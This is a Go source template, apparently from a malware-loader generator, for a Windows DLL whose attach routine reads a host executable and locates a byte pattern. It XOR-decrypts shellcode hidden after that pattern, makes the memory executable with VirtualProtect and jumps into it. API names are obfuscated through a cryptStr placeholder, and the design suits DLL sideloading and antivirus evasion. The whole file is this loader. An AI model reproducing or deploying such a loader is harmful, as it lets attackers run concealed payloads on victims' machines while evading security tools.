package main

import "C"

import (
	"bytes"
	"encoding/binary"
	"io/ioutil"
	"path/filepath"
	"syscall"
	"unsafe"
)

var (
	shellcodeFile  = "settings.dat"
)

const (
    MEM_COMMIT     = 0x00001000
    MEM_RESERVE    = 0x00002000
    MEM_RELEASE    = 0x8000
    PAGE_READWRITE = 0x04
	PAGE_EXECUTE_READ = 0x20
)

var (
    kernel32           = syscall.NewLazyDLL({{ cryptStr "kernel32.dll" }})
    procVirtualProtect = kernel32.NewProc({{ cryptStr "VirtualProtect" }})
)

{{ .FuncXorEncode }}

func VirtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer) bool {
    ret, _, _ := procVirtualProtect.Call(
        uintptr(lpAddress),
        uintptr(dwSize),
        uintptr(flNewProtect),
        uintptr(lpflOldProtect))
    return ret > 0
}

func RUN(buf []byte) {
	var pBaseAddr = unsafe.Pointer(&buf[0])
	var dwBufferLen = uint(len(buf))
	var dwOldPerm uint32

	if !VirtualProtect(pBaseAddr, uintptr(dwBufferLen), PAGE_EXECUTE_READ, unsafe.Pointer(&dwOldPerm)) {
		panic("error")
	}

	syscall.Syscall(
		uintptr(unsafe.Pointer(&buf[0])),
		0, 0, 0, 0,
	)
}

// XorEncryptDecrypt 异或加解密
func XorEncryptDecrypt(input, key []byte) (output []byte) {
	for i := 0; i < len(input); i++ {
		output = append(output, byte(input[i]^key[i%len(key)]))
	}
	return output
}

func decryptShellcode(shellcodeData []byte) []byte {
	shellcodeReader := bytes.NewReader(shellcodeData)
	var keyLen int64
	err := binary.Read(shellcodeReader, binary.LittleEndian, &keyLen)
	if err != nil {
		panic(err)
	}
	var key = make([]byte, keyLen)
	err = binary.Read(shellcodeReader, binary.LittleEndian, key)
	if err != nil {
		panic(err)
	}
	var shellcodeLen int64
	err = binary.Read(shellcodeReader, binary.LittleEndian, &shellcodeLen)
	if err != nil {
		panic(err)
	}
	var shellcodeE = make([]byte, shellcodeLen)
	err = binary.Read(shellcodeReader, binary.LittleEndian, shellcodeE)
	if err != nil {
		panic(err)
	}
	shellcode := XorEncryptDecrypt(shellcodeE, key)
	return shellcode
}

func extractShellcode(data []byte, pattern []byte) []byte {
	// pattern的组成，4byte长度(长度xor解密) + shellcode前12位
	for i := 0; i < len(data); i++ {
		if data[i] != pattern[0] {
			continue
		}
		isMatch := true
		for j := 0; j < len(pattern); j++ {
			if data[i+j] != pattern[j] {
				isMatch = false
				break
			}
		}
		if isMatch {
			return data[i+len(pattern):]
		}
	}
	return nil
}

//export OnProcessAttach
func OnProcessAttach() {
	// ex, _ := os.Executable()
	// exPath := filepath.Dir(ex)
	// shellcode := decryptShellcode(filepath.Join(exPath, shellcodeFile))
	// ioutil.WriteFile(filepath.Join(exPath, "1.txt"), []byte(base64.StdEncoding.EncodeToString(shellcode)), 0666)
	mainProgram := {{ cryptStr .MainProgram }}
	filepath, err := filepath.Abs(mainProgram)
	if err != nil {
		panic(err)
	}
	content, err := ioutil.ReadFile(filepath)
	if err != nil {
		panic(err)
	}
	cryptedShellcode := extractShellcode(content, {{ .Pattern }})
	shellcode := decryptShellcode(cryptedShellcode)
    RUN(shellcode)
}

func main() {
}